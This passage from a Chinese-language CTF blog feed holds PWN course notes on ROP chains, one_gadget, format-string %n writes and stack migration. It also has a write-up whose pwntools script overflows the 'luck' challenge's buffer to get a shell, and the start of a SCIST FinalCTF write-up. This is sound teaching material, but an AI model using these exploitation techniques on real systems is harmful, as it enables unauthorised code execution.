puts_libclibc_base <span class="token operator">=</span> puts_got_value - puts_libcsystem_got_value <span class="token operator">=</span> libc_base + system_libc</code></pre><h4 id="取得puts-libc"><a href="#取得puts-libc" class="headerlink" title="取得puts_libc"></a>取得puts_libc</h4><pre class=" language-bash"><code class="language-bash">% readelf -a /libc.so.6 <span class="token operator">|</span> <span class="token function">grep</span> puts</code></pre><h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h4><p>在 libc 中可以一次拿到 shell address</p><p>必須符合規定限制 &amp;&amp; 有 libc base</p><p>usage： <code>% one_gadget /libc.so.6</code></p><h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP(Return Oriented Programming)"></a>ROP(Return Oriented Programming)</h3><p>串接 Gadget 來控制流程</p><h4 id="Gadget-結尾是-ret-的程式碼片段"><a href="#Gadget-結尾是-ret-的程式碼片段" class="headerlink" title="Gadget - 結尾是 ret 的程式碼片段"></a>Gadget - 結尾是 <code>ret</code> 的程式碼片段</h4><p>找適合的 gadget<br><code>% ROPgadget --binary ./test | less</code><br><code>% ROPgadget --binary ./test | grep '*ret'</code></p><p>好用的 gadget</p><pre class=" language-bash"><code class="language-bash">leave <span class="token punctuation">;</span> retpop * <span class="token punctuation">;</span> ret</code></pre><h4 id="ROP-chain"><a href="#ROP-chain" class="headerlink" title="ROP chain"></a>ROP chain</h4><p>把 gadget 串起來<br><img src="https://i.imgur.com/wcpjb8y.png?80"><br>Step</p><ol><li>ret address of gadget 1</li><li>pop address of gadget 1</li><li>rsp 移動到 0xabcd</li><li>pop rax -&gt; rax = 0xabcd</li><li>ret 到 address of gadget 2</li><li>pop address of gadget 2</li><li>pop rbx -&gt; rbx = 0x1234</li><li>ret …….依此循環</li></ol><h4 id="利用-ROP-攻擊-串接-syscall"><a href="#利用-ROP-攻擊-串接-syscall" class="headerlink" title="利用 ROP 攻擊 - 串接 syscall"></a>利用 ROP 攻擊 - 串接 syscall</h4><p><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">x86_64_syscall_table</a><br>利用 ROP chain，依照 syscall table 把 rax , rdi , rsi , rdx 等設定好後 call syscall</p><h4 id="Syscall-execve-“-x2F-bin-x2F-sh”"><a href="#Syscall-execve-“-x2F-bin-x2F-sh”" class="headerlink" title="Syscall - execve(“/bin/sh”)"></a>Syscall - execve(“/bin/sh”)</h4><p>設定<br>rax = 0x3b<br>rdi = address of ‘/bin/sh’<br>(rdi -&gt; buffer -&gt; ‘/bin/sh’)<br>rsi = 0<br>rdx = 0<br>設定完後 call syscall 就可以了</p><h2 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h2><p>printf 使用上可以操作的漏洞，可以做到任意讀寫</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span>“<span class="token operator">%</span>s”<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Input</span>    <span class="token function">printf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Output</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中 scanf 有指定 format(<code>%s</code>)，但 printf 沒有指定 format<br>若是輸入 format，input 會作為 format 被輸出</p><pre class=" language-bash"><code class="language-bash">% ./test%p,%p,%p0x1,0x7f10e7dc3790,0xa</code></pre><p>printf 參數 <code>%n$p</code> 指定第 n 個參數</p><h3 id="讀取"><a href="#讀取" class="headerlink" title="讀取"></a>讀取</h3><ul><li><code>%p</code> ：印出 register / stack 上存的值</li><li><code>%s</code>: 將 register / stack 上的值作為位址，印出該位址所<br>存的值</li></ul><h4 id="p-印出存的值"><a href="#p-印出存的值" class="headerlink" title="%p 印出存的值"></a>%p 印出存的值</h4><p>讀取順序：rsi -&gt; rdx -&gt; rcx -&gt; r8 -&gt; r9 -&gt; *rsp -&gt; *(rsp+0x8)<br>前幾個在 register 上，第 6 個開始在 stack 上(通常要的是 stack上的)<br>Ex. <code>%11$p</code> 會印出 <code>*(rsp+0x28)</code> 的值 </p><h4 id="s-將存的值作為指標來讀取"><a href="#s-將存的值作為指標來讀取" class="headerlink" title="%s 將存的值作為指標來讀取"></a>%s 將存的值作為指標來讀取</h4><p>若 payload 在 stack 上，可以把特定 address 寫在 stack 上來讀取<br><img src="https://i.imgur.com/unzIwBt.png?60"></p><h3 id="寫入"><a href="#寫入" class="headerlink" title="寫入"></a>寫入</h3><p>使用 <code>%n</code> 來將 printf 輸出過的字元數寫到指定的位置<br><code>%hn</code> 2 bytes<br><code>%hhn</code> 1 bytes (字元數 % 256)</p><p><code>%c</code> 指定 <code>%n</code> 寫入大小<br>Ex. input：0x1234</p><ol><li><code>%52c%?$hhn</code> 0x34 = 52 ? 放 address</li><li><code>%222c%?hhn</code> ((256-0x34)+0x12)%256</li></ol><p>若 payload 在 stack 上，可以把特定 address 寫在 stack 上來寫入<br><img src="https://i.imgur.com/fziXjZD.png"></p><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>當可輸入的 ROP chain 長度不足時，擴展輸入的方法<br>概念：將 ROP chain 寫在不同位置，透過移動 stack 來執⾏</p><p>假設能輸入的 gadget 長度只有一個</p><ol><li>直接放 one gadget</li><li>跳到其他 function</li><li><strong>⽤ stack migration 創造新空間</strong></li></ol><p>Stack Migration</p><ol><li>把 ROP 先寫在 buffer 上</li><li>ret 前，把 stack (rsp) 移到 buffer 上面</li></ol><p>尋找 buffer：開 gdb <code>vmmap</code></p><h3 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h3><pre class=" language-bash"><code class="language-bash">leaveret</code></pre><p>leave 做的動作</p><pre class=" language-bash"><code class="language-bash">mov rsp, rbp <span class="token comment" spellcheck="true"># 把 rsp 跳到 rbp 上面 (rbp 可控)</span>pop rbp</code></pre><h3 id="Simple-Migration-可控制輸入長度時"><a href="#Simple-Migration-可控制輸入長度時" class="headerlink" title="Simple Migration - 可控制輸入長度時"></a>Simple Migration - 可控制輸入長度時</h3><p>在 ROP chain 中 call input func，把新的 ROP chain 寫到 buffer 裡面</p><p>第一次輸入(stack)<br>call input func，把 input 儲存點(rbp)設為 buffer 1 的 address<br><img src="https://i.imgur.com/7FjrChg.png"></p><p>第二次輸入(buffer1)<br>from ROP chain I 的 input func<br><img src="https://i.imgur.com/rF3lIjE.png"><br>[註]如果不需要再 migration，buffer2 可以隨便填(因為不會用到 <code>leave</code> 去移動 stack 到 buffer2 上)，也不用重新 call input func </p><h3 id="Fixed-Size-Migration-不能控制輸入長度時"><a href="#Fixed-Size-Migration-不能控制輸入長度時" class="headerlink" title="Fixed Size Migration - 不能控制輸入長度時"></a>Fixed Size Migration - 不能控制輸入長度時</h3><p>直接用原本的 read 來輸入<br>一次可以輸入的 ROP 長度為 payload 長度</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 校園資安深耕營 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Note </tag>
            
            <tag> 校園資安深耕營 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyFirstPWN 張元_Pwn-1_luck write-up</title>
      <link href="/2021/08/29/MyFirstPWN-%E5%BC%B5%E5%85%83-Pwn-1-luck-write-up/"/>
      <url>/2021/08/29/MyFirstPWN-%E5%BC%B5%E5%85%83-Pwn-1-luck-write-up/</url>
      
        <content type="html"><![CDATA[<a href="/2021/08/29/Advanced-CyberSecurity-Day-Note-PWN/" title="點此回到 PWN 課程 Note">點此回到 PWN 課程 Note</a><h2 id="Step1-執行看看"><a href="#Step1-執行看看" class="headerlink" title="Step1 - 執行看看"></a>Step1 - 執行看看</h2><p>先去執行看看，它會讓我們輸入東西<br><img src="https://i.imgur.com/x9wSaUD.png"></p><h2 id="Step2-分析第一階段"><a href="#Step2-分析第一階段" class="headerlink" title="Step2 - 分析第一階段"></a>Step2 - 分析第一階段</h2><p>我們可以先用 r2 去分析第一階段要做什麼<br><img src="https://i.imgur.com/rf8z3sR.png"></p><pre class=" language-bash"><code class="language-bash">$ r2 ./luck <span class="token comment" spellcheck="true">#進入 r2</span><span class="token operator">></span> aa <span class="token comment" spellcheck="true">#分析</span><span class="token operator">></span> afl <span class="token comment" spellcheck="true">#列出 function，其中我們可以看到 main()</span><span class="token operator">></span> s main <span class="token comment" spellcheck="true">#進到 main()</span><span class="token operator">></span> VV <span class="token comment" spellcheck="true">#visual mode</span></code></pre><h2 id="Step3-進入visual-mode"><a href="#Step3-進入visual-mode" class="headerlink" title="Step3 - 進入visual mode"></a>Step3 - 進入visual mode</h2><blockquote><p>技巧：從call function 看(綠色的)</p></blockquote><p><img src="https://i.imgur.com/DMNnJgh.png"><br>call function 的前面(mov…)在設定 call function 的參數</p><p><img src="https://i.imgur.com/dRBlWGN.png"><br>從這裡可以看到它會去比較(<code>cmp</code>)兩次，都是 true 的話會有個 “Hello hacker,now guess the password”，所以我們的目標是進入這裡</p><h2 id="Step4-看一下-main-function-有哪些區域變數"><a href="#Step4-看一下-main-function-有哪些區域變數" class="headerlink" title="Step4 - 看一下 main function 有哪些區域變數"></a>Step4 - 看一下 main function 有哪些區域變數</h2><p><img src="https://i.imgur.com/cfk0L22.png"><br>將上面這些整理為 <img src="https://i.imgur.com/FjKrbOu.png" height="50%"></p><blockquote><p>rbp 位於藍色與綠色塊中間</p></blockquote><h2 id="Step5-看一下-random"><a href="#Step5-看一下-random" class="headerlink" title="Step5 - 看一下 random"></a>Step5 - 看一下 random</h2><p>可以看到 random call 完後，eax 就會回傳產出的 random 值，將它存在 <code>var_ch</code> 內</p><h2 id="Step6-看一下能夠輸入多少字"><a href="#Step6-看一下能夠輸入多少字" class="headerlink" title="Step6 - 看一下能夠輸入多少字"></a>Step6 - 看一下能夠輸入多少字</h2><p><img src="https://i.imgur.com/Rxn5afJ.png"><br>在 read function 可以看到 <code>buff</code> 在<code>var_20h</code><br><code>mov edx, 0x64</code> 可以看出我們可以輸入 64 個 bytes</p><p><img src="https://i.imgur.com/7F3sWAq.png"><br>從這張圖可以看到 <code>var_20h</code> ，也就是 buffer，只有 4 個 bytes，但我們卻可以輸入 64 個，因此我們可以做 overflow的大小為 64 - 4 = 60，藍色的範圍都是我們可以控制的</p><h2 id="Step7-確認-address"><a href="#Step7-確認-address" class="headerlink" title="Step7 - 確認 address"></a>Step7 - 確認 address</h2><p><img src="https://i.imgur.com/kNIBURF.png"><br>從剛才的<code>cmp</code>那裡可以看到，我們須滿足下面兩個條件<br><code>local_14h = 0xfaceb00c</code><br><code>local_10h = 0xdeadbeef</code></p><p>因此我們寫一個 python 去 exploit，去作出下面的結構<br><img src="https://i.imgur.com/1LSvjXw.png"></p><p><img src="https://i.imgur.com/YwqSDRI.png"><br>從這裡可以看到我們輸入的地方在第三行，而第二行後還有一個<code>\n</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./luck'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第一行</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第二行</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xfaceb00c</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#p32(0x4->32bytes)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://i.imgur.com/mT0WFW7.png"><br>執行後可以看到我們通過了第一階段</p><h2 id="Step8-分析第二階段"><a href="#Step8-分析第二階段" class="headerlink" title="Step8 - 分析第二階段"></a>Step8 - 分析第二階段</h2><p><img src="https://i.imgur.com/EsHygvz.png"></p><p><code>scanf()</code>有二個參數，第一個參數是 format，我們去看一下<br><code>s 0x400a93</code><br>然後跳到 Hex mode<br><img src="https://i.imgur.com/sEh9bKc.png"><br>在<code>0x40093</code>可以看到它吃的是<code>%d</code>(代表整數)<br>讀一個整數進來後會存到 <code>var_1ch</code><br>剛才有題到 random 會存在 <code>var_ch</code></p><h2 id="Step9-寫script"><a href="#Step9-寫script" class="headerlink" title="Step9 - 寫script"></a>Step9 - 寫script</h2><p><img src="https://i.imgur.com/BErwebM.png"><br>從這裡可以看到 <code>var_1ch</code> 要等於 <code>var_ch</code><br>雖然我們不知道<code>var_ch</code>是什麼，但我們可以把它覆蓋掉阿~<br>可以把它改成<code>1</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./luck'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第一行</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第二行</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xfaceb00c</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>接著我們輸入<code>1</code>後就可以拿到 shell 了！<br><img src="https://i.imgur.com/CxOpd3n.png"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 校園資安深耕營 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
            <tag> 校園資安深耕營 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 SCIST FinalCTF write-up</title>
      <link href="/2021/07/22/2021-SCIST-FinalCTF-write-up/"/>
      <url>/2021/07/22/2021-SCIST-FinalCTF-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>第一屆 SCIST 資安課程 季後賽</p><table><thead><tr><th>ID</th><th>gunjyo</th></tr></thead><tbody><tr><td>Date</td><td>2021/07/20 10:00 - 2021/7/22 10:00</td></tr><tr><td>Rank(Official)</td><td>1</td></tr><tr><td>Rank(All)</td><td>5</td></tr><tr><td>Score</td><td>3002</td></tr><tr><td>FirstBlood</td><td>1</td></tr><tr><td>Solves</td><td>8/14</td></tr></tbody></table><p><img src="https://i.imgur.com/8HsQ8HH.png" alt="Scoreboard"></p><p><img src="https://i.imgur.com/mOIid7m.png" alt="Solves"></p><h2 id="Misc-3-x2F-3"><a href="#Misc-3-x2F-3" class="headerlink" title="Misc (3/3)"></a>Misc (3/3)</h2><h3 id="QQCode-100"><a href="#QQCode-100" class="headerlink" title="QQCode(100)"></a>QQCode(100)</h3><blockquote><p>Author: MuMu</p></blockquote><p><img src="https://i.imgur.com/AOQ4xEb.png" alt="題目"></p><p>修 QRCode<br>使用工具：<a href="https://merricx.github.io/qrazybox/">CrazyBox</a></p><p><img src="https://i.imgur.com/1UEsWha.png" alt="修復後"></p><blockquote><p>flag:<code>SCIST{0mg_cAn_U_sT0p_D35Tr0y1Ng_mY_qrC0de?}</code></p></blockquote><h3 id="Weird-Email-304"><a href="#Weird-Email-304" class="headerlink" title="Weird Email(304)"></a>Weird Email(304)</h3><blockquote><p>Oops, this email has been modified,<br>But secret still there,<br>Can you find it?<br>Author: nella17</p></blockquote><p>給了一份.eml檔案</p><p>用郵件打開後長這樣 <img src="https://i.imgur.com/NEmcWZG.png"></p><div class="spoiler collapsed">    <div class="spoiler-title">        用 VScode 打開    </div>    <div class="spoiler-content">        <pre class=" language-html"><code class="language-html">MIME-Version: 1.0Date: Wed, 21 Jul 2021 09:55:00 +0800Message-ID: &lt;CAFrE2-zGa+RL7QLCM6-g8roXCRb=_Y4vEwri3VLcqSNrL4yKvA@mail.gmail.com>Subject: The Final Countdown LyricsFrom: "SCIST, Official" <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>no_reply@scist.org</span><span class="token punctuation">></span></span>To: Official SCIST <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>no_reply@scist.org</span><span class="token punctuation">></span></span>Content-Type: multipart/alternative; boundary="000000000000cc444505c77bad41"--000000000000cc444505c77bad41Content-Type: text/plain; charset="UTF-8"Content-Transfer-Encoding: quoted-printableThe Final CountdownEurope - Live At Sweden Rock 30th Anniversary ShowOhh ho ohhThe final countdown, oh hoIt's the final countdownThe final countdownThe final countdown(The final countdown)OhhIt's the final countdownWe're leaving togetherThe final countdownWe'll all miss her soIt's the final countdown(The final countdown)Ohh, it's the final countdownYea.Source: MetroLyricsSCIST{=E2=84=B31=E2=93=82=E2=93=94_4=E2=84=95=E1=B5=88_=E2=84=9A-=E2=92=BA==E1=B4=BA=E2=84=AD0d=E2=84=B9=EF=B8=8F=EF=BD=8E9_a=E2=93=A1e_c=E2=93=9E0=E2==84=93}=E5=AD=A3=E5=BE=8C=E8=B3=BD--000000000000cc444505c77bad41Content-Type: text/html; charset="UTF-8"Content-Transfer-Encoding: quoted-printable&lt;div dir=3D"ltr">&lt;div style=3D"color:white">&lt;div style=3D"margin:0px;paddin=g:0px;border:0px;font-family:DDG_ProximaNova,DDG_ProximaNova_UI_0,DDG_Proxi=maNova_UI_1,DDG_ProximaNova_UI_2,DDG_ProximaNova_UI_3,DDG_ProximaNova_UI_4,=DDG_ProximaNova_UI_5,DDG_ProximaNova_UI_6,<span class="token entity" title="&quot;">&amp;quot;</span>Proxima Nova<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>He=lvetica Neue<span class="token entity" title="&quot;">&amp;quot;</span>,Helvetica,<span class="token entity" title="&quot;">&amp;quot;</span>Segoe UI<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Nimbus Sans L<span class="token entity" title="&quot;">&amp;quot;</span>=,<span class="token entity" title="&quot;">&amp;quot;</span>Liberation Sans<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Open Sans<span class="token entity" title="&quot;">&amp;quot;</span>,FreeSans,Arial,sans-seri=f;font-weight:600;font-stretch:inherit;line-height:1em;font-size:1.67em;ver=tical-align:baseline;word-wrap:break-word;color:black;opacity:1">&lt;span styl=e=3D"font-family:inherit;font-size:24.047998428344727px;font-style:inherit;=font-variant-caps:inherit;font-weight:inherit">The Final Countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;b=r><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;padding:0px;border:0px;font-family:DDG_Pr=oximaNova,DDG_ProximaNova_UI_0,DDG_ProximaNova_UI_1,DDG_ProximaNova_UI_2,DD=G_ProximaNova_UI_3,DDG_ProximaNova_UI_4,DDG_ProximaNova_UI_5,DDG_ProximaNov=a_UI_6,<span class="token entity" title="&quot;">&amp;quot;</span>Proxima Nova<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Helvetica Neue<span class="token entity" title="&quot;">&amp;quot;</span>,Helvetica,<span class="token entity" title="&quot;">&amp;quot;</span>=Segoe UI<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Nimbus Sans L<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Liberation Sans<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>=Open Sans<span class="token entity" title="&quot;">&amp;quot;</span>,FreeSans,Arial,sans-serif;font-stretch:inherit;line-height:=1.84em;font-size:0.92em;vertical-align:baseline;color:rgb(102,102,102);disp=lay:block;text-transform:capitalize;opacity:1">Europe - Live At Sweden Rock= 30th Anniversary Show<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;div style=3D"margin:0px;padding:10px 0px 0px;=border:0px;font-family:DDG_ProximaNova,DDG_ProximaNova_UI_0,DDG_ProximaNova=_UI_1,DDG_ProximaNova_UI_2,DDG_ProximaNova_UI_3,DDG_ProximaNova_UI_4,DDG_Pr=oximaNova_UI_5,DDG_ProximaNova_UI_6,<span class="token entity" title="&quot;">&amp;quot;</span>Proxima Nova<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Helvetic=a Neue<span class="token entity" title="&quot;">&amp;quot;</span>,Helvetica,<span class="token entity" title="&quot;">&amp;quot;</span>Segoe UI<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Nimbus Sans L<span class="token entity" title="&quot;">&amp;quot;</span>,&amp;quot=;Liberation Sans<span class="token entity" title="&quot;">&amp;quot;</span>,<span class="token entity" title="&quot;">&amp;quot;</span>Open Sans<span class="token entity" title="&quot;">&amp;quot;</span>,FreeSans,Arial,sans-serif;font=-stretch:inherit;line-height:1.45em;font-size:14.399999618530273px;vertical=-align:baseline;word-wrap:break-word;color:black;opacity:1">&lt;span style=3D"=margin:0px;padding:0px;border:0px;font-family:inherit;font-style:inherit;fo=nt-variant-caps:inherit;font-stretch:inherit;line-height:inherit;vertical-a=lign:baseline">Ohh ho ohh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span= style=3D"margin:0px;padding:0px;border:0px;font-family:inherit;font-style:=inherit;font-variant-caps:inherit;font-weight:600;font-stretch:inherit;line=-height:inherit;vertical-align:baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;sp=an style=3D"margin:0px;padding:0px;border:0px;font-family:inherit;font-styl=e:inherit;font-variant-caps:inherit;font-weight:600;font-stretch:inherit;li=ne-height:inherit;vertical-align:baseline">countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>, oh ho<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2==A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>It<span class="token entity" title="&#39;">&amp;#39;</span>s the<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;padd=ing:0px;border:0px;font-family:inherit;font-style:inherit;font-variant-caps=:inherit;font-weight:600;font-stretch:inherit;line-height:inherit;vertical-=align:baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;pa=dding:0px;border:0px;font-family:inherit;font-style:inherit;font-variant-ca=ps:inherit;font-weight:600;font-stretch:inherit;line-height:inherit;vertica=l-align:baseline">countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0&lt;/s=pan>&lt;span style=3D"margin:0px;padding:0px;border:0px;font-family:inherit;fo=nt-style:inherit;font-variant-caps:inherit;font-weight:600;font-stretch:inh=erit;line-height:inherit;vertical-align:baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0&lt;=/span>&lt;span style=3D"margin:0px;padding:0px;border:0px;font-family:inherit;=font-style:inherit;font-variant-caps:inherit;font-weight:600;font-stretch:i=nherit;line-height:inherit;vertical-align:baseline">countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>==C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;padding:0p=x;border:0px;font-family:inherit;font-style:inherit;font-variant-caps:inher=it;font-weight:600;font-stretch:inherit;line-height:inherit;vertical-align:=baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;span style=3D"margin:0px;padding:=0px;border:0px;font-family:inherit;font-style:inherit;font-variant-caps:inh=erit;font-weight:600;font-stretch:inherit;line-height:inherit;vertical-alig=n:baseline">countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>(The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>&lt;=span style=3D"margin:0px;padding:0px;border:0px;font-family:inherit;font-st=yle:inherit;font-variant-caps:inherit;font-weight:600;font-stretch:inherit;=line-height:inherit;vertical-align:baseline">final<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2=A0&lt;/span=>&lt;span style=3D"margin:0px;padding:0px;border:0px;font-family:inherit;font-=style:inherit;font-variant-caps:inherit;font-weight:600;font-stretch:inheri=t;line-height:inherit;vertical-align:baseline">countdown<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>=C2==A0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token 